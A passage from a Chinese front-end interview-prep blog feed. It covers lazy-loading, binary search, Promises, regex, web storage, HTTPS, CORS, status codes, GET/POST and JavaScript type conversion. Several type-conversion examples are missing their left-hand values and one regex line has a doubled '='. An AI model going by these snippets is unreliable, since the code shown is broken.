class="token punctuation">"</span>./images/8.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/9.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/10.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/1.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./images/2.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> imgs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//offsetTop是元素与offsetParent的距离，循环获取直到页面顶部</span>        <span class="token keyword">function</span> <span class="token function">getTop</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> T <span class="token operator">=</span> e<span class="token punctuation">.</span>offsetTop<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>e <span class="token operator">=</span> e<span class="token punctuation">.</span>offsetParent<span class="token punctuation">)</span> <span class="token punctuation">{</span>                T <span class="token operator">+</span><span class="token operator">=</span> e<span class="token punctuation">.</span>offsetTop<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> T<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">lazyLoad</span><span class="token punctuation">(</span>imgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> H <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取可视区域高度</span>            <span class="token keyword">var</span> S <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>scrollTop <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>scrollTop<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> imgs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>H <span class="token operator">></span> <span class="token function">getTop</span><span class="token punctuation">(</span>imgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>S<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    imgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>src <span class="token operator">=</span> imgs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'data-src'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        window<span class="token punctuation">.</span>onload <span class="token operator">=</span> window<span class="token punctuation">.</span>onscroll <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//onscroll()在滚动条滚动的时候触发</span>            <span class="token function">lazyLoad</span><span class="token punctuation">(</span>imgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>        high <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> mid <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> mid<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="promise能封装setInterval吗"><a href="#promise能封装setInterval吗" class="headerlink" title="promise能封装setInterval吗"></a>promise能封装setInterval吗</h2><p>不能，因为promise只能执行一次</p><pre class=" language-js"><code class="language-js">          <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>解决办法</p><pre class=" language-js"><code class="language-js">           <span class="token keyword">function</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token function">setInterval</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（二）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>使用正则判断邮箱是否合法</li><li>Cooike,sessionStorge,localStorge的区别</li><li>http 和 https</li><li>怎么解决跨域问题</li><li>输入域名到展示页面发生了什么</li><li>常见的状态码</li><li>get与post的区别</li><li>垃圾回收机制（GC算法）</li><li>JS隐式转换与显示转换</li><li>对象的键支持什么类型</li></ul><h2 id="使用正则判断邮箱是否合法"><a href="#使用正则判断邮箱是否合法" class="headerlink" title="使用正则判断邮箱是否合法"></a>使用正则判断邮箱是否合法</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> pattern <span class="token operator">=</span> <span class="token regex">/^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//字符+@+字符+.+字母</span>pattern<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true or false</span></code></pre><blockquote><p>正则基本知识</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//1.横向模糊匹配,一个正则可匹配的字符串的长度不是固定的</span><span class="token comment" spellcheck="true">//比如/ab{2,5}c/表示匹配这样一个字符串：第一个字符是“a”，接下来是2到5个字符“b”，最后是字符“c”</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/ab{2,5}c/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc abbc abbbc abbbbc abbbbbc abbbbbbc"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["abbc", "abbbc", "abbbbc", "abbbbbc"]</span><span class="token comment" spellcheck="true">//2.纵向模糊匹配，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符</span><span class="token comment" spellcheck="true">//比如/a[123]b/可以匹配如下三种字符串："a1b"、"a2b"、"a3b"。测试如下：</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/a[123]b/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"a0b a1b a2b a3b a4b"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["a1b", "a2b", "a3b"]</span><span class="token comment" spellcheck="true">//3.范围表示法，比如[123456abcdefGHIJKLM]，可以写成[1-6a-fG-M]</span><span class="token comment" spellcheck="true">//要匹配“a”、“-”、“z”这三者中任意一个字符，不能写成[a-z]，可以写成如下的方式：[-az]或[az-]或[a\-z]</span><span class="token comment" spellcheck="true">//4.排除字符组</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token operator">=</span> <span class="token regex">/[^abc]/</span><span class="token comment" spellcheck="true">//5.常见简写</span><span class="token comment" spellcheck="true">/*\d就是[0-9]。表示是一位数字。记忆方式：其英文是digit（数字）。\D就是[^0-9]。表示除数字外的任意字符。\w就是[0-9a-zA-Z_]。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。\W是[^0-9a-zA-Z_]。非单词字符。\s是[ \t\v\n\r\f]。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。\S是[^ \t\v\n\r\f]。 非空白符。.通配符，表示几乎任意字符。*/</span><span class="token comment" spellcheck="true">//6.多选分支</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/good|nice/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"good idea, nice try."</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["good", "nice"]</span><span class="token comment" spellcheck="true">//7. ^代表开头，$代表结尾</span></code></pre><h2 id="Cooike-sessionStorge-localStorge的区别"><a href="#Cooike-sessionStorge-localStorge的区别" class="headerlink" title="Cooike,sessionStorge,localStorge的区别"></a>Cooike,sessionStorge,localStorge的区别</h2><blockquote><p>Cooike始终在同源的HTTP请求中携带，会在浏览器和服务器之间传递。<br>sessionStorge和localStorge不会发送给服务器，仅在本地保存<br>Cooike不能超过4k，session和local一般小于5M<br>localStorge存储的是持久数据，浏览器关闭不丢失。SessionStorge在关闭窗口后会自动删除。</p></blockquote><h2 id="http-和-https"><a href="#http-和-https" class="headerlink" title="http 和 https"></a>http 和 https</h2><blockquote><p>https并非应用层的一种新协议，只是http通信接口部分用ssl/tls协议代替而已。<br>SSL和TLS都是加密协议<br>通常http直接和tcp通信，当使用ssl时则演变成先和ssl通信，再由ssl和tcp通信。<br>所谓https，其实就是身披ssl协议这层外壳的http。（回忆一下osi7层,TCP/IP4层，我们学的是5层）</p><p>SSL协议采用的是非对称加密算法，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密.</p><p>RSA算法：两个大素数p,q，n=pq,f(n)=(p-1)(q-1),1&lt;b&lt;f(n),a=b^-1modf(n),公钥n,b,私钥p,q,a</p><p>证书，顾名思义，就是证明的文件。例如浏览器和 tlanyan.me 服务器通信，浏览器怎么知道对方就是 tlanyan.me 对应的服务器呢？在不可信的网络下通信，中立的第三方作用就显现出来了。权威的第三方中立机构（ Certificate Authority, CA）收到 tlanyan.me 持有者的证书请求并核验信息后，将持有者的名称、公钥与 CA 用私钥生成的数字签名等信息写成证书颁发给申请者。</p></blockquote><h2 id="怎么解决跨域问题"><a href="#怎么解决跨域问题" class="headerlink" title="怎么解决跨域问题"></a>怎么解决跨域问题</h2><blockquote><p>1、 通过jsonp跨域: 直接请求文件不行，请求JS可以，我们就把数据以JSON格式装进JS文件里</p><p>客户端： 服务端的js文件：<br>function handleCallback(res) { handleCallback({<br>alert(JSON.stringify(res)); “status”: true, “user”: “admin”<br>} })</p><p>其实jsonp是前后端共同约定的一种结果。</p><p>2、 document.domain + iframe跨域:<br>news.baidu.com和map.baidu.com的一级域名相同，故可以设置document.domain = “baidu.com”;就可以跨域</p><p>3、 location.hash + iframe<br>4、 window.name + iframe跨域<br>5、 postMessage跨域<br>6、 跨域资源共享（CORS） Access-Control-Allow-Origin: *<br>主要通过后端来配置，CORS规范将请求分为两种类型，一种是简单请求，一种是带预检的非简单请求。<br>如果是简单请求，就先执行服务端程序，然后浏览器才会判断是否跨域；GET HEAD,POST<br>而对于非简单请求，浏览器会在发送实际请求之前先发送一个OPTIONS的HTTP请求来判断服务器是否能接受该跨域 请求；如果不能接受的话，浏览器会直接阻止接下来实际请求的发生。 服务端可以设置携带cooike</p><p>7、 nginx代理跨域<br>正向代理：我们将请求发送给代理服务器，代理服务器去访问，然后将访问到的数据传递给我们。隐藏了客户端<br>反向代理：在服务器端，有很多服务器处理请求，nginx扮演的就是一个反向代理角色，隐藏了服务器。<br>启动nginx服务器把server_name设置成前端的域名，此时前端发起的请求相当于是localhost对localhost发 起，这样是不会引起跨域的。</p><p>8、 nodejs中间件代理跨域 与nginx代理跨域类似<br>9、 WebSocket协议跨域<br>WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯</p><p>10、webpack的proxy，webpack的dev-server模块会启动一个服务器，这个服务器不止帮我们做了自动更新，同时也可以做到<strong>反向</strong>代理。就是我们把请求发送给webpack-dev-server, 然后webpack-dev-server再去请求后端服务器，服务之间的请求是没有跨域问题的</p></blockquote><p><a href="https://my.oschina.net/u/2401092/blog/4412558" target="_blank" rel="noopener">正向代理&amp;反向代理</a></p><h2 id="输入域名到展示页面发生了什么"><a href="#输入域名到展示页面发生了什么" class="headerlink" title="输入域名到展示页面发生了什么"></a>输入域名到展示页面发生了什么</h2><p><a href="https://juejin.cn/post/6869279683230629896" target="_blank" rel="noopener">(超详细）从输入url到页面展示发生了什么？</a></p><blockquote><p>DNS（Domain Name System，域名系统），简单的说：就是把我们输入的网站域名翻译成IP地址的系统.</p><p>1.在浏览器中输入url</p><p>2.客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到</p><p>3.有了服务器的IP， 浏览器就要可以发起HTTP请求了,联系之前的HTTP和HTTPS</p><p>4.Http会基于TCP建立起一个到服务器的连接通道，TCP是面向连接可靠的服务，联系三次握手四次握手<br>Udp是无连接的，想发就发，不会对数据进行封装。适用于实时应用，就比如视频面试。TCP可靠，用于文件传输。</p><p>5.传输层下面是网络层，作用是把TCP分割好的各种数据包传送给接收方，这里需要用到mac地址，一个网络设备的IP地 址可以更换，但是MAC地址一般是固定不变的.ARP协议可以将IP地址解析成对应的MAC地址。</p><p>6.在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束</p><p>7.接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文,返回响应报文，联系返回码。</p><p>8.请求成功之后，服务器会返回响应的HTML文件，接下来就到页面渲染了，联系到渲染引擎。</p><p>9.构建dom树-&gt;计算DOM树每个结点的样式-&gt;页面布局-&gt;生成分层树-&gt;栅格化（转化为位图，GPU可以处理）-&gt;显示</p></blockquote><h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><blockquote><p>1XX Informational（信息性状态码） 接受的请求正在处理<br>2XX Success（成功状态码） 请求正常处理完毕<br>3XX Redirection（重定向状态码） 请求的URL已移走。响应报文中应该包含一个Location URL，说明资源现在所处<br>4XX Client Error（客户端错误状态码） 服务器无法处理请求<br>5XX Server Error（服务器错误状态码） 服务器处理请求出错</p><p>2XX——表明请求被正常处理了<br>200 OK：请求已正常处理。<br>204 No Content：请求处理成功，但没有任何资源可以返回给客户端，</p><p>3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</p><p>301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</p><p>302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</p><p>304 Not Modified：304状态码是告诉浏览器可以从缓存中获取所请求的资源。</p><p>4XX——表明客户端是发生错误的原因所在。</p><p>400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</p><p>404 Not Found：服务器上没有请求的资源。路径错误等。</p><p>5XX——服务器本身发生错误</p><p>500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</p><p>502 Bad Gateway：作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</p><p>503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</p><p>504 Gateway Time-out：作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。</p></blockquote><h2 id="get与post的区别"><a href="#get与post的区别" class="headerlink" title="get与post的区别"></a>get与post的区别</h2><blockquote><p>GET请求，请求的数据会附加在URL之后，以?分割URL和传输数据，多个参数用&amp;连接，传输数据会受URL长度限制<br>POST请求：POST请求会把请求的数据放置在HTTP请求包的包体中，数据不受限制，数据不暴露会更安全</p></blockquote><ul><li>GET 方法参数写法是固定的吗？</li></ul><p>在约定中，我们的参数是写在 <code>?</code> 后面，用 <code>&amp;</code> 分割。</p><p>我们知道，解析报文的过程是通过获取 TCP 数据，用正则等工具从数据中获取 Header 和 Body，从而提取参数。</p><p>也就是说，我们可以自己约定参数的写法，只要服务端能够解释出来就行。</p><ul><li>POST 方法比 GET 方法安全？</li></ul><p>按照网上大部分文章的解释，POST 比 GET 安全，因为数据在地址栏上不可见。</p><p>然而，从传输的角度来说，他们都是不安全的，因为 HTTP 在网络上是明文传输的，只要在网络节点上捉包，就能完整地获取数据报文。</p><p><strong>要想安全传输，就只有加密，也就是 HTTPS。</strong></p><ul><li>GET 方法的长度限制是怎么回事？</li></ul><p>在网上看到很多关于两者区别的文章都有这一条，提到浏览器地址栏输入的参数是有限的。</p><p>首先说明一点，HTTP 协议没有 Body 和 URL 的长度限制，对 URL 限制的大多是浏览器和服务器的原因。</p><p>浏览器原因就不说了，服务器是因为处理长 URL 要消耗比较多的资源，为了性能和安全（防止恶意构造长 URL 来攻击）考虑，会给 URL 长度加限制。</p><ul><li>POST 方法会产生两个 TCP 数据包？</li></ul><p>有些文章中提到，post 会将 header 和 body 分开发送，先发送 header，服务端返回 100 状态码再发送 body。</p><p>HTTP 协议中没有明确说明 POST 会产生两个 TCP 数据包，而且实际测试(Chrome)发现，header 和 body 不会分开发送。所以，header 和 body 分开发送是部分浏览器或框架的请求方法，不属于 post 必然行为</p><h2 id="垃圾回收机制（GC算法）"><a href="#垃圾回收机制（GC算法）" class="headerlink" title="垃圾回收机制（GC算法）"></a>垃圾回收机制（GC算法）</h2><p><a href="https://www.jinjingxuan.com/2020/08/26/%E6%B5%8F%E8%A7%88%E5%99%A8-GC%E7%AE%97%E6%B3%95%EF%BC%8CV8%E5%BC%95%E6%93%8E/" target="_blank" rel="noopener">GC算法，V8引擎</a></p><h2 id="JS隐式转换与显示转换"><a href="#JS隐式转换与显示转换" class="headerlink" title="JS隐式转换与显示转换"></a>JS隐式转换与显示转换</h2><h3 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h3><blockquote><p>1.undefined与null相等，但不恒等（===）<br>2.一个是number一个是string时，会尝试将string转换为number<br>3.隐式转换将boolean转换为number，0或1<br>4.隐式转换将Object转换成number或string，取决于另外一个对比量的类型<br>5.对于0、空字符串的判断，建议使用 “===” 。<br>6.“==”会对不同类型值进行类型转换再判断，“===”则不会。它会先判断两边的值类型，类型不匹配时直接为false。</p></blockquote><pre class=" language-js"><code class="language-js">undefined <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true   </span><span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true  </span><span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// false  </span><span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true</span><span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true   </span><span class="token number">NaN</span> <span class="token operator">==</span> <span class="token number">NaN</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// false  NaN不等于任何值</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true  </span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// true           !会将其转为布尔值，![]的值为false，==操作符将false转为0，[]==0</span><span class="token string">'6'</span> <span class="token operator">-</span> <span class="token string">'3'</span>  <span class="token comment" spellcheck="true">// 3               []也会转为数字0   0==0</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token operator">!</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//false           {} == false  ->  {} == 0  ->   NaN == 0    ->  false</span><span class="token number">1234</span> <span class="token operator">+</span> <span class="token string">'abcd'</span> <span class="token comment" spellcheck="true">// "1234abcd"</span></code></pre><h3 id="显式转换"><a href="#显式转换" class="headerlink" title="显式转换"></a>显式转换</h3><blockquote><p>显示转换一般指使用Number、String和Boolean三个构造函数，手动将各种类型的值，转换成数字、字符串或者布尔值。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">'1234'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1234</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">'1234abcd'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// NaN</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 0</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 1</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 0</span><span class="token function">Number</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// NaN</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">1234</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// "1234"</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// "abcd"</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// "true"</span><span class="token function">String</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "undefined"</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// "null"</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" 